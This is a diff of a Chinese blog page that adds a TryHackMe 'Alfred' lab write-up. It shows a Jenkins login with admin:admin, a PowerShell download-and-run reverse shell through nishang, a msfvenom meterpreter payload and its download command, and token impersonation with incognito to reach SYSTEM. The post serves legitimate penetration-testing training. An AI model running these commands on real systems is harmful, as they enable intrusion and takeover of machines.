@@ -25,12 +25,12 @@
     var CONFIG = {"hostname":"noone40404.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="初始打点         80 端口没什么东西，8080 是 jenkins 登陆界面，用弱密码 admin:admin 登进去了是实战中想都不敢想的东西   看来一圈，本来想不按照 THM 的提示，用 manage jenkins 中的 script console 来命令执行。但正常的命令可以做到，下载反弹 shell 的命令就不行了：         update：之后破案了，靶机没wge">
+  <meta name="description" content="幽默完了，试图硬传msf马导致浪费一个小时，感觉是语法问题，回头可以回来看一眼">
 <meta property="og:type" content="article">
 <meta property="og:title" content="THM打靶日寄3-Alfred">
 <meta property="og:url" content="http://noone40404.github.io/2024/09/10/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%843%EF%BC%9AAlfred/index.html">
 <meta property="og:site_name" content="noone___&#39;s blog">
-<meta property="og:description" content="初始打点         80 端口没什么东西，8080 是 jenkins 登陆界面，用弱密码 admin:admin 登进去了是实战中想都不敢想的东西   看来一圈，本来想不按照 THM 的提示，用 manage jenkins 中的 script console 来命令执行。但正常的命令可以做到，下载反弹 shell 的命令就不行了：         update：之后破案了，靶机没wge">
+<meta property="og:description" content="幽默完了，试图硬传msf马导致浪费一个小时，感觉是语法问题，回头可以回来看一眼">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://pic.imgdb.cn/item/66e03274d9c307b7e92c494f.png">
 <meta property="og:image" content="https://pic.imgdb.cn/item/66e0329ad9c307b7e92c7fd5.png">
@@ -39,8 +39,16 @@
 <meta property="og:image" content="https://pic.imgdb.cn/item/66e03f0fd9c307b7e943a730.png">
 <meta property="og:image" content="https://pic.imgdb.cn/item/66e040fad9c307b7e9460ddf.png">
 <meta property="og:image" content="https://pic.imgdb.cn/item/66e040e1d9c307b7e945f2ae.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66e04ea6d9c307b7e95e7e82.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66e0511fd9c307b7e9624b19.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66e0551ad9c307b7e96ab3ed.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66e05577d9c307b7e96c0b16.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66e0589fd9c307b7e9730d35.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66e059d9d9c307b7e974b10d.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66e05a5bd9c307b7e9756c8f.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/66e05ab5d9c307b7e975e2fa.png">
 <meta property="article:published_time" content="2024-09-10T05:10:00.000Z">
-<meta property="article:modified_time" content="2024-09-10T12:54:55.915Z">
+<meta property="article:modified_time" content="2024-09-10T14:52:39.868Z">
 <meta property="article:author" content="noone___">
 <meta property="article:tag" content="THM">
 <meta property="article:tag" content="靶场">
@@ -242,7 +250,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2024-09-10 13:10:00 / 修改时间：20:54:55" itemprop="dateCreated datePublished" datetime="2024-09-10T13:10:00+08:00">2024-09-10</time>
+              <time title="创建时间：2024-09-10 13:10:00 / 修改时间：22:52:39" itemprop="dateCreated datePublished" datetime="2024-09-10T13:10:00+08:00">2024-09-10</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -262,6 +270,7 @@
               <span class="post-meta-item-text">阅读次数：</span>
               <span id="busuanzi_value_page_pv"></span>
             </span>
+            <div class="post-description">幽默完了，试图硬传msf马导致浪费一个小时，感觉是语法问题，回头可以回来看一眼</div>
 
         </div>
       </header>
@@ -286,7 +295,64 @@
 <p>  试图简单反弹 <code>shell</code> 但是失败了，即使根据报错查到的，加上 <code>exit 0</code> 也不行</p>
 <p>  <img src="https://pic.imgdb.cn/item/66e040fad9c307b7e9460ddf.png" alt=""></p>
 <p>  <img src="https://pic.imgdb.cn/item/66e040e1d9c307b7e945f2ae.png" alt=""></p>
-<p>   THM这里让使用 <code>Powershell</code> 脚本来传，而建议用的 <code>nishang</code> 的反弹 <code>shell</code> 直接用高级的 <code>msfvenom</code> 就行</p>
+<p>  THM这里让使用 <code>Powershell</code> 脚本来传 <code>nishang</code> 的反弹 <code>shell</code> ：<code>powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://10.11.99.99:8000/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.11.15.168 -Port 1234</code></p>
+<p>  这里本来想试着直接反弹 <code>msfvenom</code> 生成的 <code>Powershell</code> 脚本，但一直有报错，卡了我一个小时了，包括普通的 <code>exe</code> 也不行，很奇怪：</p>
+<p>  <img src="https://pic.imgdb.cn/item/66e04ea6d9c307b7e95e7e82.png" alt=""></p>
+<p>  于是老老实实慢慢拿shell：</p>
+<p>  在 <code>/nishang/Shells</code> 直接用 <code>python -m http.server</code> 开服务器</p>
+<p>  在那个 <code>build</code> 模块下：<code>powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://10.11.99.99:8000/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.11.99.99 -Port 1234</code> ，分别从服务器下载并运行 <code>powershell</code> 脚本</p>
+<p>  应用一下，然后到主页 <code>build now</code> 以启动命令</p>
+<p>  <img src="https://pic.imgdb.cn/item/66e0511fd9c307b7e9624b19.png" alt=""></p>
+<p>  然后经典在当前用户的桌面找到flag</p>
+</li>
+<li><p><code>msf</code> 提权</p>
+<p>  用上面的方法传马，并用刚刚连接的命令行来启动。一个比较幽默的点是必须先停止命令行，再下载，再启动命令行再启动木马</p>
+<p>  生成木马，注意端口号别重复：<code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.99.99 LPORT=4321 -f exe -o qwq.exe</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/66e0551ad9c307b7e96ab3ed.png" alt=""></p>
+<p>  传马的命令：<code>powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.11.99.99:8000/qwq.exe&#39;,&#39;qwq.exe&#39;)&quot;</code></p>
+<p>  <code>msf</code> 的监听：</p>
+<p>  <img src="https://pic.imgdb.cn/item/66e05577d9c307b7e96c0b16.png" alt=""></p>
+<p>  命令行那里直接 <code>./qwq</code> 启动木马，<code>msf</code> 成功上线</p>
+</li>
+<li><p>账户令牌伪造实现Windows提权</p>
+<p>  这里昨天的 <code>Powerup</code> 脚本扫描没有扫到有用的东西</p>
+<ul>
+<li><p>Windows 账户令牌：</p>
+<p>  访问令牌包括：用户SID，组SID，Privileges权限</p>
+<p>  目前只需要关注账户的权限，以下是容易被滥用的权限，<strong>可用的权限可被用于模拟其他用户的令牌</strong>：</p>
+<ul>
+<li><p>SeImpersonatePrivilege</p>
+</li>
+<li><p>SeAssignPrimaryPrivilege</p>
+</li>
+<li><p>SeTcbPrivilegesedbprivilege相关</p>
+</li>
+<li><p>SeBackupPrivilegeSeBackupPrivilege服务</p>
+</li>
+<li><p>SeRestorePrivilege返回特权</p>
+</li>
+<li><p>SeCreateTokenPrivilege</p>
+</li>
+<li><p>SeLoadDriverPrivilege</p>
+</li>
+<li><p>SeTakeOwnershipPrivilege</p>
+</li>
+<li><p>SeDebugPrivilege</p>
+</li>
+</ul>
+<p>使用 <code>whoami /priv</code> 来查权限是否可用，<del>令人感慨的是meterpreter不支持whoami命令</del></p>
+<p><img src="https://pic.imgdb.cn/item/66e0589fd9c307b7e9730d35.png" alt=""></p>
+<p>这里要使用 <code>msf</code> 的 <code>incognito</code> 模块，其专门用于 <code>Windows</code> 系统的用户令牌窃取：<code>load incognito</code></p>
+<p>用 <code>list_tokens -g</code> 来查找可用的 <code>token</code> ，找到了可用的admin</p>
+<p><img src="https://pic.imgdb.cn/item/66e059d9d9c307b7e974b10d.png" alt=""></p>
+<p><code>impersonate_token &quot;BUILTIN\Administrators&quot;</code> 来伪造该 <code>token</code></p>
+<p><img src="https://pic.imgdb.cn/item/66e05a5bd9c307b7e9756c8f.png" alt=""></p>
+<p><code>getuid</code> 能看到这里已经是 <code>SYSTEM</code> 权限了</p>
+<p><img src="https://pic.imgdb.cn/item/66e05ab5d9c307b7e975e2fa.png" alt=""></p>
+<p>但注意，为了保险起见，要把恶意进程迁移至 <code>services.exe</code> 中：</p>
+<p><code>ps</code> 查看当前所有进程，<code>migrate [进程PID]</code> 来迁移，<del>没图是因为进程里面没找到service.exe（逃</del></p>
+</li>
+</ul>
 </li>
 </ul>
 
@@ -329,7 +395,10 @@
     <a href="/2024/09/09/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%842%EF%BC%9Asteel%20mountain/" rel="prev" title="THM打靶日寄2-steel mountain">
       <i class="fa fa-chevron-left"></i> THM打靶日寄2-steel mountain
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2024/09/11/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%844%EF%BC%9AHackPark/" rel="next" title="THM打靶日寄4-HackParl">
+      THM打靶日寄4-HackParl <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -404,20 +473,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">109</span>
+          <span class="site-state-item-count">118</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">76</span>
+        <span class="site-state-item-count">77</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
